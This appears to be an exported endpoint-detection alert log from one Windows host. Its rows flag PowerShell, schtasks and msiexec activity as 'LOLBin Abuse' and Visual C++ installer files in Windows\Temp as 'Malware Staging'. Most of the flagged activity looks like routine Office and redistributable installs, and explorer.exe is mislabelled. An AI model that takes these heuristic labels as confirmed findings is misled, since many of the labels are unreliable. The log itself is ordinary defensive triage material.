"Jun 1, 2026 @ 14:23:11.851",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F734FE45
"Jun 1, 2026 @ 14:23:11.774",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-313B3349
"Jun 1, 2026 @ 14:23:11.067",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-2665007F
"Jun 1, 2026 @ 14:23:10.940",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-AA3416E0
"Jun 1, 2026 @ 14:22:55.234",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-ED8948A6
"Jun 1, 2026 @ 14:22:55.212",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_ncck5xkd.k2e.psm1,,deletion,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-0CCC5785
"Jun 1, 2026 @ 14:22:55.208",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_5vbnvlbw.fig.ps1,,deletion,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F9D12F82
"Jun 1, 2026 @ 14:22:55.201",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_ncck5xkd.k2e.psm1,,creation,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DA9BFF63
"Jun 1, 2026 @ 14:22:55.195",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_5vbnvlbw.fig.ps1,,creation,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B1423A66
"Jun 1, 2026 @ 14:22:55.182",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-628DE54F
"Jun 1, 2026 @ 14:22:54.686",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-03D43BB3
"Jun 1, 2026 @ 14:22:54.643",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\office_portable_x3.exe,,creation,"1,860",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-085857AB
"Jun 1, 2026 @ 14:21:57.229",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Background Push Maintenance"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"37,280",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-EF1D4F7C
"Jun 1, 2026 @ 14:21:57.223",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"37,280",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B50B3B6E
"Jun 1, 2026 @ 14:21:57.145",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Background Push Maintenance"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"37,280",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-02802B50
"Jun 1, 2026 @ 14:21:57.122",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"12,400",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-695A992B
"Jun 1, 2026 @ 14:21:57.035",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Background Push Maintenance"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"21,416",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-CB04FA41
"Jun 1, 2026 @ 14:21:57.030",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"21,416",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-2B35266E
"Jun 1, 2026 @ 14:23:10.754",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-DAF79D67
"Jun 1, 2026 @ 14:23:10.737",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"6,972",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9E801E2B
"Jun 1, 2026 @ 14:21:43.287",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI1C3.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-0B554B65
"Jun 1, 2026 @ 14:21:43.283",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,,,load,"25,464",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-07BE8570
"Jun 1, 2026 @ 14:21:43.251",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSI1C3.tmp,,modification,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-0FD53423
"Jun 1, 2026 @ 14:21:43.238",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\Installer\MSIFDF9.tmp,,deletion,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9DF65C00
"Jun 1, 2026 @ 14:21:43.236",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\15bcee47.rbs,,overwrite,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-2BA454BE
"Jun 1, 2026 @ 14:21:42.919",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,25,Living-off-the-land binary: msiexec.exe,,,,C:\Config.Msi\15bcee47.rbs,,creation,"5,516",T1218,,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-FC3C8B1C
"Jun 1, 2026 @ 14:21:56.938",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Background Push Maintenance"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"21,416",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-F94E6838
"Jun 1, 2026 @ 14:21:56.928",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Background Push Maintenance""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"28,296",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-B2C9C155
"Jun 1, 2026 @ 14:21:56.915",C:\Windows\System32\schtasks.exe,,,LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,load,"28,296",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-9C6E836F
"Jun 1, 2026 @ 14:21:56.804",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /Delete /F /tn ""Microsoft\Office\Office Background Push Maintenance""",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,start,"28,296",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-E87DA1FF
"Jun 1, 2026 @ 14:21:56.769",C:\Windows\System32\schtasks.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"schtasks.exe /change /tn ""Microsoft\Office\Office Background Push Maintenance"" /enable",LOLBin Abuse,25,Living-off-the-land binary: schtasks.exe,,,,,,end,"10,064",T1053.005,Scheduled Task,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-D0090E88
"Jun 1, 2026 @ 14:23:15.694",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-8E592E12
"Jun 1, 2026 @ 14:23:15.681",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_0ucesdw0.nn3.psm1,,deletion,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-6F43D795
"Jun 1, 2026 @ 14:23:15.679",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,C:\Users\DELL\AppData\Local\Temp\__PSScriptPolicyTest_cwxcdz2s.bj5.ps1,,deletion,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-57B6AFF9
"Jun 1, 2026 @ 14:23:15.677",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-041BF8B3
"Jun 1, 2026 @ 14:23:15.639",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-3C77E43E
"Jun 1, 2026 @ 14:23:15.633",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,LOLBin Abuse,25,Living-off-the-land binary: powershell.exe,,,,,,load,"11,540",T1059.001,PowerShell,False,LOW,LOW,Needs Review,Monitor,Review full command line and parent process chain,AH-48D28A63
"Jun 1, 2026 @ 14:21:44.610",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-2F65235E
"Jun 1, 2026 @ 14:21:44.609",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\logo.png,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-678CA06D
"Jun 1, 2026 @ 14:21:44.608",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-8F3183C5
"Jun 1, 2026 @ 14:21:44.607",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\thm.xml,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-8E2F10B5
"Jun 1, 2026 @ 14:21:44.606",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\wixstdba.dll,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-C4C3F510
"Jun 1, 2026 @ 14:21:44.584",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,,,load,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-7CC046DD
"Jun 1, 2026 @ 14:21:47.380",C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe,C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,"""C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe"" -q -burn.elevated BurnPipe.{0C83A7F5-5C38-4377-970D-BEEE2DD89719} {F2D4B40C-DF24-4C82-8BCB-A559D3DEADA8} 34308",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{4d6017be-87c2-47b2-8e1b-aa3353d660ba}\.be\vc_redist.x86.exe,,,,,,end,"20,236",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-CFED8990
"Jun 1, 2026 @ 14:21:47.360",C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{4d6017be-87c2-47b2-8e1b-aa3353d660ba}\.be\vc_redist.x86.exe,,,,C:\ProgramData\Package Cache\{0b5169e3-39da-4313-808e-1f9c0407f3bf}\state.rsm,,overwrite,"20,236",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-628BD972
"Jun 1, 2026 @ 14:21:47.342",C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{4d6017be-87c2-47b2-8e1b-aa3353d660ba}\.be\vc_redist.x86.exe,,,,C:\ProgramData\Package Cache\{0b5169e3-39da-4313-808e-1f9c0407f3bf}\state.rsm,,overwrite,"20,236",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-8D61AAC5
"Jun 1, 2026 @ 14:21:47.167",C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{4d6017be-87c2-47b2-8e1b-aa3353d660ba}\.be\vc_redist.x86.exe,,,,,,load,"20,236",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-EF7DF6DC
"Jun 1, 2026 @ 14:21:47.088",C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe,C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,"""C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe"" -q -burn.elevated BurnPipe.{0C83A7F5-5C38-4377-970D-BEEE2DD89719} {F2D4B40C-DF24-4C82-8BCB-A559D3DEADA8} 34308",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{4d6017be-87c2-47b2-8e1b-aa3353d660ba}\.be\vc_redist.x86.exe,,,,,,start,"20,236",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-F3BE4000
"Jun 1, 2026 @ 14:21:47.050",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,,,modification,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-356C17AC
"Jun 1, 2026 @ 14:21:47.048",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-045137B1
"Jun 1, 2026 @ 14:21:58.054",C:\Windows\explorer.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\explorer.exe,,,,C:\Users\DELL\AppData\Local\Temp\{dd4af201-dbb4-4743-944e-0e1ce635d258}.png,,deletion,"7,284",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-D47A8B74
"Jun 1, 2026 @ 14:21:58.039",C:\Windows\explorer.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\explorer.exe,,,,C:\Users\DELL\AppData\Local\Temp\{dd4af201-dbb4-4743-944e-0e1ce635d258}.png,,creation,"7,284",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-1783A372
"Jun 1, 2026 @ 14:21:58.020",C:\Windows\explorer.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\explorer.exe,,,,C:\Users\DELL\AppData\Local\Temp\{83a7b31e-d67c-4f19-baef-41c3e6404f1b}.png,,deletion,"7,284",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-95AABA5E
"Jun 1, 2026 @ 14:21:47.408",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x86.exe,"""C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe"" -burn.clean.room=""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x86.exe"" -burn.filehandle.attached=784 -burn.filehandle.self=592 /quiet /norestart",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,,,end,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-580D1B4C
"Jun 1, 2026 @ 14:21:47.402",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Users\DELL\AppData\Local\Temp\dd_vcredist_x86_20260601142146.log,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-666F913A
"Jun 1, 2026 @ 14:21:47.401",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe,,deletion,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-C1324754
"Jun 1, 2026 @ 14:21:47.400",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\wixstdba.dll,,deletion,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-20827E08
"Jun 1, 2026 @ 14:21:58.123",C:\Windows\explorer.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\explorer.exe,,,,C:\Users\DELL\AppData\Local\Temp\{83115d11-b386-4a29-878b-d2bc01327358}.png,,deletion,"7,284",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-F3A49AA3
"Jun 1, 2026 @ 14:21:46.854",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,,,load,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-ADDA9663
"Jun 1, 2026 @ 14:21:46.368",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\BootstrapperApplicationData.xml,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-FDDEDD80
"Jun 1, 2026 @ 14:21:46.367",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\3082\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-87602474
"Jun 1, 2026 @ 14:21:46.366",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\3082\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-32D72F73
"Jun 1, 2026 @ 14:21:46.365",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\2052\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-632006EA
"Jun 1, 2026 @ 14:21:46.364",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\2052\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-D5038306
"Jun 1, 2026 @ 14:21:46.361",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1055\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-B9673940
"Jun 1, 2026 @ 14:21:46.360",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1055\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-8E11B926
"Jun 1, 2026 @ 14:21:46.358",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1049\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-91BBBBAE
"Jun 1, 2026 @ 14:21:46.357",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1049\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-9F9DB173
